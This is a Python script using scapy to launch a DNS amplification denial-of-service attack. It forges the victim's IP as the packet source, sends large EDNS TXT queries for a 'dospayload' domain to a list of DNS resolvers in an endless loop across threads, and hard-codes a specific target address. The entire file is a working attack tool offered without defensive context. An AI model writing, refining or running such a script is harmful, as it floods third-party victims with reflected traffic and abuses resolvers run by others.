import sys
import threading

from scapy.volatile import RandShort
from scapy.sendrecv import send
from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNS, DNSQR, DNSRROPT

def send_packet(target, dns):
    global thread_started
    thread_started += 1
    print(f"Thread {thread_started} started")

    full_dns = "dospayload.chickenkiller.com"
    packet = (
        IP(src=target, dst=dns) /
        UDP(sport=RandShort(), dport=53) /
        DNS(
            id=0xdead,
            qr=0, # Query (0) or Response (1)
            opcode=0, # Standard query
            rd=1, # Recursion desired
            ad=1, # Authentic data
            tc=0, # cannot set in query but we expect the response is not truncated
            # qd=DNSQR(qname=full_dns,qtype=255), # 255 means ANY
            qd=DNSQR(qname=full_dns,qtype=16), # 16 means TXT
            ar=DNSRROPT(
                rclass=4096, # maximum is 4096
                version=0,
                z=0x0000,
                extrcode=00, # Higher bits in extended RCODE
                rdata=[b'\x00\x0a\x00\x08\x31\xb4\x09\x09\x4b\xb5\xaf\x56'] # cookie part, copy from dig response resovled by Wireshark
            )
        )
    )
    # packet.show()
    # send(packet, verbose=False)
    send(packet, loop=1, verbose=False, inter=0.1, realtime=False)



def main():
    if len(sys.argv) == 1:
        print("please enter target ip")
    else:
        target = sys.argv[1]
        threads = []

        with open("./TW_DNS", 'r') as f:
            lines =  f.readlines()
            for line in lines:
                dns = line.strip()
                thread = threading.Thread(target=send_packet, args=(target, dns,))
                thread.start()
                threads.append(thread)


        # for thread in threads:
        #     thread.join()


if __name__ == "__main__":
    thread_started = 0
    send_packet("140.115.205.74", "36.235.136.251")
    # main()
